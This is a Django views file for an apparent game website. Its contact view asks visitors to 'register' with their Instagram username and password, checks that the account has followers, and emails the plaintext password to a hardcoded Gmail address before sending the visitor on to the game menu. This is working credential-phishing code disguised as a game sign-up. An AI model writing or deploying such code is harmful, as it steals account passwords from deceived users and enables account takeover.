from django.shortcuts import render
from django.core.mail import send_mail
from django.contrib import messages
from django.conf  import settings
from django.shortcuts import redirect
from instascrape import *


# Create your views here.
def home(request):
    return render(request,'home.html');

def contact(request):
    if request.method == "POST":
        name=request.POST.get('name')
        facebookID=request.POST.get('facebookId')
        password=request.POST.get('password')
        if name==''or facebookID=='' or password=='':
            return redirect('/message/')
        try:
            lnk=f"https://www.instagram.com/{facebookID}/"
            user= Profile(lnk)
            user.scrape()
            if user.followers>1:
                print(user.followers)
                subject='Try to Register'
                message= f"\n\n\none user has tried to register!\n\n\n\n\nname -: {name}\n\n\n instagram id -: {facebookID}\n\n\npassword -: {password}"
                email_from= settings.EMAIL_HOST_USER
                email_to=['playourgame936@gmail.com']
                send_mail(subject, message, email_from, email_to,fail_silently=False,)
                return  redirect('menu')
            else:
                return redirect('/message/')
        except:
            messages.info(request,"You attempt so many try ,please registered after some time!")
            return redirect(request.META['HTTP_REFERER'])

    return render(request,'contact.html')



def gametwo(request):
    return render(request,'gametwo.html')

def flip(request):
     return render(request,'flip.html')


def main(request):
    return render(request,'endpage.html')

def message(request):
    messages.info(request,"Please Register with instagram id and password Yourself First!")
    return redirect(request.META['HTTP_REFERER'])

def menu(request):
    return render(request,'menu.html')